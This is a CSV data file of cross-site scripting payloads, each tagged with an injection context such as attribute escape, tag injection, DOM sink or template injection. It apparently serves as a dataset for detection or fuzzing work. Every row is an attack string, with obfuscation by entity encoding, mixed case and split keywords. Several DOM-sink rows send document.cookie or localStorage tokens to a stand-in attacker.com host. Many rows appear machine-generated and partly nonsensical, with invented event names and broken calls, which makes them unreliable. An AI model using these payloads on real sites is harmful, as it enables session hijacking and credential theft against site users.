payload,context
<animatemotion ondblclick=console.log(1) ondblclick=console.log(1)>,tag_injection
"\"" onpoint&#101;rdown=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape
"<scr	ipt>Function('console.log(String.fromCharCode(88,83,83))')();</scr	ipt>",script_injection
"<soUrcE	oNvoLumEchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<teXtaRea onScrOllEnd=alErt('XSS')>,tag_injection
\' ontouchend=\u0061lert('XSS')//,attribute_escape
onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt&#40;1&#41;,event_handler
"Obj&#101;ct.&#97;ssign(window,{""onb&#101;for&#101;copy"":XMLHttpR&#101;qu&#101;st})",dom_sink
"setTimeout(""eval('//attacker.com/?c='+document.cookie)"",0)",dom_sink
""" %3E%3Csvg onerror=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
%27 ><svg onbeforepaste=confirm(document.domain)>,attribute_escape
<%= prompt 1 %>,template_injection
${confirm?new()(%27document.domain%27)},template_injection
"""%3E%3Ctemplate onsearch=console.log(document.domain)%3E",tag_injection
<source src=x oninput=alert(location.hash)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNpaUse"":cOnfIrm})",dom_sink
"\"" OnmOusEovEr=ProMpt(1)//",attribute_escape
' onsearch=alert('XSS') ',attribute_escape
'><Img srC=x onPagEreVeaL=pRomPt(LocAtiOn.HasH)>,attribute_escape
%27 ><svg oncut=confirm(%27XSS%27)>,attribute_escape
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=f&#101;tch('XSS')>"")",dom_sink
'><Img srC=x onDraGenTer=prOmpT(dOcuMenT.dOmaIn)>,attribute_escape
"EvaL(""AleRt(DocUmeNt.CooKie)"")",dom_sink
""" %3E%3Csvg onended=alert('XSS')%3E",attribute_escape
""" ><svg onscrollsnapchange=prompt(location.hash)>",attribute_escape
"WinDow[""cOnsOle.loG""](1)",dom_sink
&quot; onwebkitfullscreenchange=\u0061lert('XSS') x=&quot;,attribute_escape
""" oNmoUseWheEl=AleRt(1) """,attribute_escape
'%3E%3Cimg src=x onfocusin=prompt(1)%3E,attribute_escape
<set src=x onclose=confirm(document.domain)>,tag_injection
"""><img src=x onhashchange=\u0061lert('XSS')>",attribute_escape
'><img src=x onbeforepaste=console.log('XSS')>,attribute_escape
%22><img src=x onerror=alert(1)>,attribute_escape
"\' OnpOinTerDowN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
""" onpoint&#101;rup=&#97;l&#101;rt(1) """,attribute_escape
"""><img src=x onmouseenter=confirm(String.fromCharCode(88,83,83))>",attribute_escape
<imAge/onChaNge=alErt(1)>,tag_injection
'><img src=x onpagehide=alert(location.hash)>,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=fEtcH(dOcuMenT.dOmaIn)>"")",dom_sink
<m&#101;t&#97; ondrop=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ondrop=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
'><img src=x onfocusout=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
' ><svg ondrop=prompt('XSS')>,attribute_escape
%3C!--%3E%3Ctr ontoggle=console.log(document.domain)%3E,tag_injection
<!--><mtext onfocusout=confirm(location.hash)>,tag_injection
`%3E%3Cimg src=x onpromptaction=prompt(1)%3E,attribute_escape
`%3E%3Cimg src=x onmouseover=console.log('XSS')%3E,attribute_escape
OnkEydOwn=coNsoLe.Log(doCumEnt.doMaiN),event_handler
"' ><svg onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"WinDow[""cOnsOle.loG""](doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
' ongotpointercapture=alert(1) ',attribute_escape
\%22 ongotpointercapture=console.log(%27XSS%27)//,attribute_escape
	onfocusout=&#97;l&#101;rt('XSS'),event_handler
"__proto__[""ongotpointercapture""]=XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink
onwebkitfullscreenchange=prompt/***/(document.domain),event_handler
onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
%22 onpromptdismiss=prompt(1) %22,attribute_escape
"setInterval(""alert(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink
<s&#101;t on&#101;nd=&#97;l&#101;rt(1) on&#101;nd=&#97;l&#101;rt(1)>,tag_injection
%27 oncontextmenu=alert(1) %27,attribute_escape
' onpointermove=confirm(document.domain) ',attribute_escape
onpoint&#101;rov&#101;r=prompt(docum&#101;nt.dom&#97;in),event_handler
"%3Cbody ongesturestart=console.log(String.fromCharCode(88,83,83)) ongesturestart=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"Object.assign(window,{""onpointerrawupdate"":fetch})",dom_sink
"Object.assign(window,{%22onclick%22:fetch})",dom_sink
"\"" onpoint&#101;rr&#97;wupd&#97;t&#101;=prompt('XSS')//",attribute_escape
${confirm?n&#101;w()('docum&#101;nt.cooki&#101;')},template_injection
\' on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//,attribute_escape
<&#97; onk&#101;ypr&#101;ss=confirm(1) onk&#101;ypr&#101;ss=confirm(1)>,tag_injection
"__proto__[""onplaying""]=confirm(String.fromCharCode(88,83,83))",dom_sink
	onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(loc&#97;tion.h&#97;sh),event_handler
&quOt; onCopY=pRomPt(DocUmeNt.DomAin) x=&qUot;,attribute_escape
""" ><svG oNdrOp=AleRt('XSS')>",attribute_escape
document.querySelector(%22body%22).innerHTML+=%22confirm(location.hash)%22,dom_sink
"""%3E%3Cimg src=x oninput=alert(document.domain)%3E",attribute_escape
<!--><Tr OnfOcuS=cOnfIrm('XSS')>,tag_injection
<listing onwebkitanimationend=console.log('XSS') onwebkitanimationend=console.log('XSS')>,tag_injection
`%3E%3Cimg src=x oncut=confirm(1)%3E,attribute_escape
"\"" ontr&#97;nsition&#101;nd=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape
<area src=x onpointercancel=console.log(document.domain)>,tag_injection
<scr	ipt>/x/confirm('XSS')</scr	ipt>,script_injection
"""><MarQueE oNkeYdoWn=ConFirM(1)>",tag_injection
<!--><video onclick=console.log('XSS')>,tag_injection
\' onmousewheel=alert(document.domain)//,attribute_escape
"element.setAttribute(""onclick"",""XMLHttpRequest(btoa(document.cookie))"")",dom_sink
"%27 onpause=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
"""><noscr	ipt onpaste=confirm(location.hash)>",tag_injection
"(new Function(""fetch(document.cookie)""))();",dom_sink
[#confirm docum&#101;nt.dom&#97;in /],template_injection
<m&#97;th x=y ondr&#97;gov&#101;r=prompt(1)>,tag_injection
"' oNgoTpoIntErcAptUre=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
' ontouchstart=console.log(1) ',attribute_escape
"%3Cnoscript
onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
%27 onmousewheel=alert(location.hash) %27,attribute_escape
%22 onbeforecut=alert(document.domain) %22,attribute_escape
	onPoiNteRup=alErt(doCumEnt.doMaiN),event_handler
'><img src=x ontransitionend=confirm('XSS')>,attribute_escape
`><img src=x onmouseover=confirm('XSS')>,attribute_escape
"\"" ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=eval(btoa(document.cookie))>%22)",dom_sink
"&quot; onscrollsnapchange=prompt(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
onpoint&#101;rov&#101;r=prompt/**/(docum&#101;nt.dom&#97;in),event_handler
"setTimeout(%22alert(1)%22,0)",dom_sink
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=console.log(document.cookie)>%22)",dom_sink
"s&#101;tInt&#101;rv&#97;l(""&#101;v&#97;l(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",100)",dom_sink
"""><di&#97;log onst&#97;ll&#101;d=confirm('XSS')>",tag_injection
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.cooki&#101;)""",dom_sink
"Object.assign(window,{%22onpause%22:fetch})",dom_sink
"setInterval(%22console.log(%27//attacker.com/?c=%27+document.cookie)%22,100)",dom_sink
"onrepeat=alert/*x*/(String.fromCharCode(88,83,83))",event_handler
"EleMenT.sEtATtrIbuTe(""onCliCk"",""cOnsOle.loG(1)"")",dom_sink
"s&#101;tTim&#101;out(""&#101;v&#97;l(loc&#97;tion.h&#97;sh)"",0)",dom_sink
&quOt; onPopStaTe=AleRt(DocUmeNt.DomAin) x=&qUot;,attribute_escape
""" on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS') """,attribute_escape
"onk&#101;ydown=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"__pRotO__[""oNseLecT""]=coNsoLe.Log(loCalStoRagE.gEtITem('tOkeN'))",dom_sink
' %3E%3Csvg onbeforecut=confirm(1)%3E,attribute_escape
window[%22confirm%22](%27//attacker.com/?c=%27+document.cookie),dom_sink
<baSe	OniNvaLid=coNfiRm(LocAtiOn.HasH)>,tag_injection
onpoint&#101;rdown=prompt(1),event_handler
{{{AleRt(1)}}},template_injection
"EvaL(""ConSolE.lOg(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)"")",dom_sink
"j&#97;v&#97;script:%0&#97;prompt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
"""><Img srC=x onPoiNteRdoWn=AleRt(DocUmeNt.DomAin)>",attribute_escape
"""><iframe ongestureend=console.log(String.fromCharCode(88,83,83))>",tag_injection
"<video
ondragstart=\u0061lert('XSS')>",tag_injection
<scr	ipt ondblclick=prompt(1)>,tag_injection
"onst&#97;ll&#101;d=consol&#101;.log/***/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
<base oninput=alert(%27XSS%27)/>,tag_injection
"onfocus=prompt/*x*/(String.fromCharCode(88,83,83))",event_handler
' ><svg onend=console.log('XSS')>,attribute_escape
"' %3E%3Csvg onpointerrawupdate=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"window[""prompt""]('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
{{$on.constructor(%27alert(document.cookie)%27)()}},template_injection
%22><math onscrollend=prompt(document.domain)>,tag_injection
%3Cbase/onpageswap=alert('XSS')%3E,tag_injection
"__proto__[""onpointerdown""]=eval(localStorage.getItem('token'))",dom_sink
javascript:void(prompt(1)),js_uri
""" ><svg onb&#101;for&#101;p&#97;st&#101;=prompt(1)>",attribute_escape
"EvaL(""EvaL(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)"")",dom_sink
"location.href=""javascript:XMLHttpRequest(String.fromCharCode(88,83,83))""",dom_sink
OndRagStaRt=JavAscRipT:cOnfIrm(1),event_handler
 ondr&#97;gov&#101;r=confirm(loc&#97;tion.h&#97;sh),event_handler
%27 onbeforematch=confirm(location.hash) %27,attribute_escape
\' onstalled=prompt(1)//,attribute_escape
"' onbegin=alert(String.fromCharCode(88,83,83)) '",attribute_escape
<scr	ipt>//confirm(location.hash)</scr	ipt>,script_injection
&quot; onsecuritypolicyviolation=prompt(1) x=&quot;,attribute_escape
"<boDy OnfOcuSouT=pRomPt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
""" oncut=\u0061lert('XSS') """,attribute_escape
\%22 ontransitionend=prompt(location.hash)//,attribute_escape
<video x=y onclick=console.log('XSS')>,tag_injection
""" oNstAllEd=ProMpt(1) """,attribute_escape
`><img src=x onwebkitfullscreenchange=alert(%27XSS%27)>,attribute_escape
<!--><template onreset=alert(location.hash)>,tag_injection
<m&#97;rqu&#101;&#101; onpopst&#97;t&#101;=&#97;l&#101;rt('XSS')/>,tag_injection
<vid&#101;o ondr&#97;gst&#97;rt=&#97;l&#101;rt('XSS')>,tag_injection
"%3Cdialog
onended=console.log(1)%3E",tag_injection
[#prompt 1 /],template_injection
"(new Function(""XMLHttpRequest(1)""))();",dom_sink
"' onpoint&#101;rr&#97;wupd&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"\' onanimationcancel=alert(String.fromCharCode(88,83,83))//",attribute_escape
%3Cscript%3E//prompt(document.domain)%3C/script%3E,script_injection
%3Cbase	onbeforecopy=console.log(location.hash)%3E,tag_injection
%27><img src=x onpagehide=alert(location.hash)>,attribute_escape
"oninput=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler
"<script>/x/consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
`><Img srC=x onTogGle=coNsoLe.Log('XSS')>,attribute_escape
' ><svG oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape
<t&#97;bl&#101; oncopy=confirm('XSS') oncopy=confirm('XSS')>,tag_injection
%27 ><svg oncut=alert(%27XSS%27)>,attribute_escape
<xss x=y ontoggle=console.log(%27XSS%27)>,tag_injection
\' ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//,attribute_escape
"<script
>&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"LocAtiOn.HreF=""JavAscRipT:eVal(btOa(DocUmeNt.CooKie))""",dom_sink
<!--><b&#97;s&#101; oninput=&#97;l&#101;rt('XSS')>,tag_injection
"""><Img srC=x onMouSewHeeL=aLerT(lOcaTioN.hAsh)>",attribute_escape
%27 ><svg onmouseover=prompt(1)>,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=eVal(StRinG.fRomChaRCoDe(88,83,83))>""",dom_sink
#{&#97;l&#101;rt('XSS')},template_injection
'><img src=x onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
%27><img src=x onfocusout=console.log(location.hash)>,attribute_escape
"\"" onpointerrawupdate=alert(location.hash)//",attribute_escape
"OntRanSitIonStaRt=ConSolE.lOg/**/(StRinG.fRomChaRCoDe(88,83,83))",event_handler
""" %3E%3Csvg onpromptdismiss=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
onanimationend=alert&#40;1&#41;,event_handler
"'><script>console.log(String.fromCharCode(88,83,83))</script>",script_injection
"__proto__[""onbegin""]=XMLHttpRequest(btoa(document.cookie))",dom_sink
\' onmouseover=prompt(document.domain)//,attribute_escape
"""><img src=x onk&#101;ydown=&#97;l&#101;rt('XSS')>",attribute_escape
""" ><svG oNcoNteXtmEnu=alErt(doCumEnt.doMaiN)>",attribute_escape
OnmOzfUllScrEenChaNge=prOmpT(lOcaTioN.hAsh),event_handler
<textarea onscrollend=alert(%27XSS%27)>,tag_injection
`><img src=x on&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
"\"" onblur=prompt('XSS')//",attribute_escape
<xss/ontoggle=console.log(%27XSS%27)>,tag_injection
""" ><svg onreset=console.log(String.fromCharCode(88,83,83))>",attribute_escape
document.querySelector(%22body%22).innerHTML+=%22confirm(document.cookie+%27&loc=%27+location.href)%22,dom_sink
"Object.assign(window,{""onend"":alert})",dom_sink
#set($x=%27confirm(1)%27)$x,template_injection
"\"" OnpOinTerDowN=aLerT(dOcuMenT.dOmaIn)//",attribute_escape
""" ><svG oNcoPy=ConFirM(lOcaTioN.hAsh)>",attribute_escape
%22><img src=x onbeforematch=confirm(1)>,attribute_escape
""" onwheel=console.log(location.hash) """,attribute_escape
"document.write(""<img src=x onerror=confirm('XSS')>"")",dom_sink
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh)""",dom_sink
<textarea x=y onscrollend=alert(%27XSS%27)>,tag_injection
""" onauxclick=confirm(location.hash) """,attribute_escape
onrepeat=alert/***/('XSS'),event_handler
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#97;l&#101;rt('XSS')"")",dom_sink
onlo&#97;d=prompt/***/(docum&#101;nt.dom&#97;in),event_handler
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=fetch(localStorage.getItem(%27token%27))>%22)",dom_sink
"document.write(""<img src=x onerror=alert(localStorage.getItem('token'))>"")",dom_sink
"<td
onKeyUp=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler
"ObjEct.asSigN(wIndOw,{""oNanImaTioNcaNceL"":ConFirM})",dom_sink
onscrollend=javascr	ipt:console.log(location.hash),event_handler
&quot; onpagereveal=alert(location.hash) x=&quot;,attribute_escape
onpoint&#101;rup=j&#97;v&#97;script:prompt(docum&#101;nt.dom&#97;in),event_handler
\' ontouchmov&#101;=confirm(docum&#101;nt.dom&#97;in)//,attribute_escape
"__pRotO__[""oNpaGesHow""]=FetCh('XSS')",dom_sink
 onkeydown=confirm(location.hash),event_handler
	onFocUsoUt=ConFirM(1),event_handler
"%3Csource
oninput=alert(location.hash)%3E",tag_injection
""" ><svg ondrop=confirm(1)>",attribute_escape
onstalled=\u0061lert/**/(document.domain),event_handler
	onSubMit=coNfiRm(DocUmeNt.DomAin),event_handler
onbeforeinput=prompt&#40;document.domain&#41;,event_handler
<video	onclick=console.log('XSS')>,tag_injection
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=fetch(document.domain)%3E"")",dom_sink
"""%3E%3Cimg src=x onpagereveal=prompt(location.hash)%3E",attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt('XSS')""",dom_sink
"'><Img srC=x onAniMatIonIteRatIon=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
""" ><svg onvolum&#101;ch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"data:text/html,<script>\u0061lert('XSS')</script>",js_uri
""" oNmoUseDowN=cOnsOle.loG('XSS') """,attribute_escape
\%27 ontoggle=console.log(%27XSS%27)//,attribute_escape
ondragover=confirm/*x*/(1),event_handler
#confirm(document.domain),template_injection
"<mt&#101;xt
onfocusout=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
onwebkitfullscreenchange=javascript:prompt(1),event_handler
"<tr/ontr&#97;nsition&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"<obj&#101;ct
onsubmit=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
	onmouseenter=\u0061lert(location.hash),event_handler
<!--><object ontouchstart=console.log(location.hash)>,tag_injection
"(new Function(%22prompt(String.fromCharCode(88,83,83))%22))();",dom_sink
' %3E%3Csvg onpromptaction=prompt(1)%3E,attribute_escape
"\"" OnfOcuSin=coNsoLe.Log(loCatIon.haSh)//",attribute_escape
""" ><svg onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
"LocAtiOn.HreF=""JavAscRipT:eVal(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)""",dom_sink
%27 ><svg ondragover=prompt(1)>,attribute_escape
java	scr	ipt:alert(1),js_uri
\%22 onrepeat=alert(location.hash)//,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;ov&#101;r"":&#101;v&#97;l})",dom_sink
""" oncopy=confirm(location.hash) """,attribute_escape
onkeydown=\u0061lert('XSS'),event_handler
"""><img src=x onb&#101;for&#101;m&#97;tch=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
	onScrOllSnaPchAngE=cOnfIrm(doCumEnt.doMaiN),event_handler
'><Img srC=x onCopY=cOnfIrm('XSS')>,attribute_escape
 ontouchmov&#101;=confirm(loc&#97;tion.h&#97;sh),event_handler
""" ><svG oNerRor=coNfiRm(LocAtiOn.HasH)>",attribute_escape
`><Img srC=x onFulLscReeNchAngE=aLerT(lOcaTioN.hAsh)>,attribute_escape
#prOmpT(1),template_injection
<imG/oNkeYprEss=coNsoLe.Log(1)>,tag_injection
on&#97;nim&#97;tion&#101;nd=prompt&#40;1&#41;,event_handler
\' onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//,attribute_escape
OnaUxcLicK=pRomPt&#40;'XSS'&#41;,event_handler
<&#97;nim&#97;t&#101;motion/ondblclick=consol&#101;.log(1)>,tag_injection
<mtext onmousedown=console.log(1) onmousedown=console.log(1)>,tag_injection
"__proto__[""onmous&#101;ov&#101;r""]=consol&#101;.log(loc&#97;tion.h&#97;sh)",dom_sink
' ontouchend=\u0061lert('XSS') ',attribute_escape
"""><img src=x onpoint&#101;rov&#101;r=consol&#101;.log('XSS')>",attribute_escape
"EvaL(""ProMpt('//atTacKer.coM/?C='+doCumEnt.coOkiE)"")",dom_sink
onwebkitfullscreenchange=alert/***/(document.domain),event_handler
"WinDow[""XMLHTtpReqUesT""](loCatIon.haSh)",dom_sink
%22><img src=x ontouchmove=confirm(document.domain)>,attribute_escape
""" ontransitionrun=alert(String.fromCharCode(88,83,83)) """,attribute_escape
'><img src=x onmouseover=confirm('XSS')>,attribute_escape
' ><svg ons&#101;&#97;rch=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
"""%3E%3Cbody onclose=console.log('XSS')%3E",tag_injection
%3Carea/onpointercancel=console.log(document.domain)%3E,tag_injection
"Object.assign(window,{%22onfocusout%22:alert})",dom_sink
 onPlaYinG=cOnsOle.loG(1),event_handler
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt&#40;'XSS'&#41;,event_handler
' ontoggle=console.log('XSS') ',attribute_escape
' ><svg onmozfullscreenchange=\u0061lert(1)>,attribute_escape
"document.querySelector(%22body%22).innerHTML+=%22prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22",dom_sink
"setTimeout(%22confirm(%27//attacker.com/?c=%27+document.cookie)%22,0)",dom_sink
' ><svg ontouchst&#97;rt=consol&#101;.log(1)>,attribute_escape
' onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
javascr	ipt:console.log(location.hash),js_uri
<seT oNcaNplAy=ConFirM(1) oNcaNplAy=ConFirM(1)>,tag_injection
{{[].pop.constructor('alert(document.domain)')()}},template_injection
"__pRotO__[""oNbeForEpaSte""]=EvaL('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)",dom_sink
"\"" onmousedown=confirm(1)//",attribute_escape
"' ><svg oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"""%3E%3Cbutton onclick=console.log(1)%3E",tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#101;v&#97;l(1)>""",dom_sink
"""%3E%3Cimg src=x oninput=alert(1)%3E",attribute_escape
"Object.assign(window,{%22onbeforecopy%22:console.log})",dom_sink
